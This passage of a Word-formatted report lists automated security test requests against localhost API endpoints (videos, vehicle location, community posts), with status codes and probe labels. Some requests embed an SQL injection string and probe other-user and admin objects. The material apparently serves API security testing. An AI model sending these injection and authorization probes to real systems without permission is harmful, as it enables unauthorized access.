        <w:br/>
        <w:t xml:space="preserve">   - Description: integer_large</w:t>
        <w:br/>
        <w:br/>
        <w:t>52. **PUT http://127.0.0.1:8888/identity/api/v2/user/videos/1**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/1`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: valid</w:t>
        <w:br/>
        <w:br/>
        <w:t>53. **PUT http://127.0.0.1:8888/identity/api/v2/user/videos/2**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/2`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: other_user</w:t>
        <w:br/>
        <w:br/>
        <w:t>54. **PUT http://127.0.0.1:8888/identity/api/v2/user/videos/testuser**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/testuser`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br/>
        <w:t>55. **PUT http://127.0.0.1:8888/identity/api/v2/user/videos/" OR "1"="1--",**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/" OR "1"="1--",`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br/>
        <w:t>56. **PUT http://127.0.0.1:8888/identity/api/v2/user/videos/99999**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/99999`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: non_existent</w:t>
        <w:br/>
        <w:br/>
        <w:t>57. **PUT http://127.0.0.1:8888/identity/api/v2/user/videos/550e8400-e29b-41d4-a716-446655440000**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/550e8400-e29b-41d4-a716-446655440000`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br/>
        <w:t>58. **PUT http://127.0.0.1:8888/identity/api/v2/user/videos/admin**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/admin`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br/>
        <w:t>59. **PUT http://127.0.0.1:8888/identity/api/v2/user/videos/1000000**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/1000000`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: high_value</w:t>
        <w:br/>
        <w:br/>
        <w:t>60. **PUT http://127.0.0.1:8888/identity/api/v2/user/videos/-1**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/-1`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: integer_negative</w:t>
        <w:br/>
        <w:br/>
        <w:t>61. **PUT http://127.0.0.1:8888/identity/api/v2/user/videos/0**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/0`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: integer_zero</w:t>
        <w:br/>
        <w:br/>
        <w:t>62. **PUT http://127.0.0.1:8888/identity/api/v2/user/videos/2147483647**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/2147483647`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: integer_large</w:t>
        <w:br/>
        <w:br/>
        <w:t>63. **DELETE http://127.0.0.1:8888/identity/api/v2/user/videos/1**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/1`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: valid</w:t>
        <w:br/>
        <w:br/>
        <w:t>64. **DELETE http://127.0.0.1:8888/identity/api/v2/user/videos/2**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/2`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: other_user</w:t>
        <w:br/>
        <w:br/>
        <w:t>65. **DELETE http://127.0.0.1:8888/identity/api/v2/user/videos/testuser**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/testuser`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br/>
        <w:t>66. **DELETE http://127.0.0.1:8888/identity/api/v2/user/videos/" OR "1"="1--",**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/" OR "1"="1--",`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br/>
        <w:t>67. **DELETE http://127.0.0.1:8888/identity/api/v2/user/videos/99999**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/99999`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: non_existent</w:t>
        <w:br/>
        <w:br/>
        <w:t>68. **DELETE http://127.0.0.1:8888/identity/api/v2/user/videos/550e8400-e29b-41d4-a716-446655440000**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/550e8400-e29b-41d4-a716-446655440000`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br/>
        <w:t>69. **DELETE http://127.0.0.1:8888/identity/api/v2/user/videos/admin**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/admin`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br/>
        <w:t>70. **DELETE http://127.0.0.1:8888/identity/api/v2/user/videos/1000000**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/1000000`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: high_value</w:t>
        <w:br/>
        <w:br/>
        <w:t>71. **DELETE http://127.0.0.1:8888/identity/api/v2/user/videos/-1**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/-1`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: integer_negative</w:t>
        <w:br/>
        <w:br/>
        <w:t>72. **DELETE http://127.0.0.1:8888/identity/api/v2/user/videos/0**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/0`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: integer_zero</w:t>
        <w:br/>
        <w:br/>
        <w:t>73. **DELETE http://127.0.0.1:8888/identity/api/v2/user/videos/2147483647**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/2147483647`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: integer_large</w:t>
        <w:br/>
        <w:br/>
        <w:t>74.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400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: string</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'video_id': 'testuser'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>75.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400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: injection</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'video_id': '" OR "1"="1--",'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>76.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400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: random_uuid</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'video_id': '550e8400-e29b-41d4-a716-446655440000'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>77. **GET http://127.0.0.1:8888/identity/api/v2/user/videos/convert_video**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/user/videos/convert_video`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: admin_user</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'video_id': 'admin'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>78. **DELETE http://127.0.0.1:8888/identity/api/v2/admin/videos/1**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/admin/videos/1`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: valid</w:t>
        <w:br/>
        <w:br/>
        <w:t>79. **DELETE http://127.0.0.1:8888/identity/api/v2/admin/videos/2**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/admin/videos/2`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: other_user</w:t>
        <w:br/>
        <w:br/>
        <w:t>80. **DELETE http://127.0.0.1:8888/identity/api/v2/admin/videos/testuser**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/admin/videos/testuser`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: string</w:t>
        <w:br/>
        <w:br/>
        <w:t>81. **DELETE http://127.0.0.1:8888/identity/api/v2/admin/videos/" OR "1"="1--",**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/admin/videos/" OR "1"="1--",`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: injection</w:t>
        <w:br/>
        <w:br/>
        <w:t>82. **DELETE http://127.0.0.1:8888/identity/api/v2/admin/videos/99999**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/admin/videos/99999`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: non_existent</w:t>
        <w:br/>
        <w:br/>
        <w:t>83. **DELETE http://127.0.0.1:8888/identity/api/v2/admin/videos/550e8400-e29b-41d4-a716-446655440000**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/admin/videos/550e8400-e29b-41d4-a716-446655440000`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: random_uuid</w:t>
        <w:br/>
        <w:br/>
        <w:t>84. **DELETE http://127.0.0.1:8888/identity/api/v2/admin/videos/admin**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/admin/videos/admin`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: admin_user</w:t>
        <w:br/>
        <w:br/>
        <w:t>85. **DELETE http://127.0.0.1:8888/identity/api/v2/admin/videos/1000000**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/admin/videos/1000000`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: high_value</w:t>
        <w:br/>
        <w:br/>
        <w:t>86. **DELETE http://127.0.0.1:8888/identity/api/v2/admin/videos/-1**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/admin/videos/-1`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: integer_negative</w:t>
        <w:br/>
        <w:br/>
        <w:t>87. **DELETE http://127.0.0.1:8888/identity/api/v2/admin/videos/0**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/admin/videos/0`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: integer_zero</w:t>
        <w:br/>
        <w:br/>
        <w:t>88. **DELETE http://127.0.0.1:8888/identity/api/v2/admin/videos/2147483647**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/admin/videos/2147483647`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: integer_large</w:t>
        <w:br/>
        <w:br/>
        <w:t>89. **GET http://127.0.0.1:8888/identity/api/v2/vehicle/1/location**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/vehicle/1/location`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: valid</w:t>
        <w:br/>
        <w:br/>
        <w:t>90. **GET http://127.0.0.1:8888/identity/api/v2/vehicle/2/location**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/vehicle/2/location`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: other_user</w:t>
        <w:br/>
        <w:br/>
        <w:t>91. **GET http://127.0.0.1:8888/identity/api/v2/vehicle/testuser/location**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/vehicle/testuser/location`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: string</w:t>
        <w:br/>
        <w:br/>
        <w:t>92. **GET http://127.0.0.1:8888/identity/api/v2/vehicle/" OR "1"="1--",/location**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/vehicle/" OR "1"="1--",/location`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: injection</w:t>
        <w:br/>
        <w:br/>
        <w:t>93. **GET http://127.0.0.1:8888/identity/api/v2/vehicle/99999/location**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/vehicle/99999/location`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: non_existent</w:t>
        <w:br/>
        <w:br/>
        <w:t>94. **GET http://127.0.0.1:8888/identity/api/v2/vehicle/550e8400-e29b-41d4-a716-446655440000/location**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/vehicle/550e8400-e29b-41d4-a716-446655440000/location`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: random_uuid</w:t>
        <w:br/>
        <w:br/>
        <w:t>95. **GET http://127.0.0.1:8888/identity/api/v2/vehicle/admin/location**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/vehicle/admin/location`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: admin_user</w:t>
        <w:br/>
        <w:br/>
        <w:t>96. **GET http://127.0.0.1:8888/identity/api/v2/vehicle/1000000/location**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/vehicle/1000000/location`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: high_value</w:t>
        <w:br/>
        <w:br/>
        <w:t>97. **GET http://127.0.0.1:8888/identity/api/v2/vehicle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/location**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/vehicle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/location`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: string_long</w:t>
        <w:br/>
        <w:br/>
        <w:t>98. **GET http://127.0.0.1:8888/identity/api/v2/vehicle/!@#$%^&amp;*()/location**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/identity/api/v2/vehicle/!@#$%^&amp;*()/location`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: string_special_chars</w:t>
        <w:br/>
        <w:br/>
        <w:t>99. **GET http://127.0.0.1:8888/community/api/v2/community/posts/1**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/community/api/v2/community/posts/1`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: valid</w:t>
        <w:br/>
        <w:br/>
        <w:t>100. **GET http://127.0.0.1:8888/community/api/v2/community/posts/2**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/community/api/v2/community/posts/2`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: other_user</w:t>
        <w:br/>
        <w:br/>
        <w:t>101. **GET http://127.0.0.1:8888/community/api/v2/community/posts/testuser**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/community/api/v2/community/posts/testuser`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: string</w:t>
        <w:br/>
        <w:br/>
        <w:t>102. **GET http://127.0.0.1:8888/community/api/v2/community/posts/" OR "1"="1--",**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/community/api/v2/community/posts/" OR "1"="1--",`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: injection</w:t>
        <w:br/>
        <w:br/>
        <w:t>103. **GET http://127.0.0.1:8888/community/api/v2/community/posts/99999**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/community/api/v2/community/posts/99999`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: non_existent</w:t>
        <w:br/>
        <w:br/>
        <w:t>104. **GET http://127.0.0.1:8888/community/api/v2/community/posts/550e8400-e29b-41d4-a716-446655440000**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/community/api/v2/community/posts/550e8400-e29b-41d4-a716-446655440000`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: random_uuid</w:t>
        <w:br/>
        <w:br/>
        <w:t>105. **GET http://127.0.0.1:8888/community/api/v2/community/posts/admin**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/community/api/v2/community/posts/admin`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: admin_user</w:t>
        <w:br/>
        <w:br/>
        <w:t>106. **GET http://127.0.0.1:8888/community/api/v2/community/posts/1000000**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/community/api/v2/community/posts/1000000`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: high_value</w:t>
        <w:br/>
        <w:br/>
        <w:t>107. **GET http://127.0.0.1:8888/community/api/v2/community/posts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**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/community/api/v2/community/posts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`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: string_long</w:t>
        <w:br/>
        <w:br/>
        <w:t>108. **GET http://127.0.0.1:8888/community/api/v2/community/posts/!@#$%^&amp;*()**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/community/api/v2/community/posts/!@#$%^&amp;*()`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: string_special_chars</w:t>
        <w:br/>
        <w:br/>
        <w:t>109. **POST http://127.0.0.1:8888/community/api/v2/community/posts/1/comment**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/community/api/v2/community/posts/1/comment`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: valid</w:t>
        <w:br/>
        <w:br/>
        <w:t>110. **POST http://127.0.0.1:8888/community/api/v2/community/posts/2/comment**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/community/api/v2/community/posts/2/comment`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: other_user</w:t>
        <w:br/>
        <w:br/>
        <w:t>111. **POST http://127.0.0.1:8888/community/api/v2/community/posts/testuser/comment**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/community/api/v2/community/posts/testuser/comment`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: string</w:t>
        <w:br/>
        <w:br/>
        <w:t>112. **POST http://127.0.0.1:8888/community/api/v2/community/posts/" OR "1"="1--",/comment**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/community/api/v2/community/posts/" OR "1"="1--",/comment`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: injection</w:t>
        <w:br/>
        <w:br/>
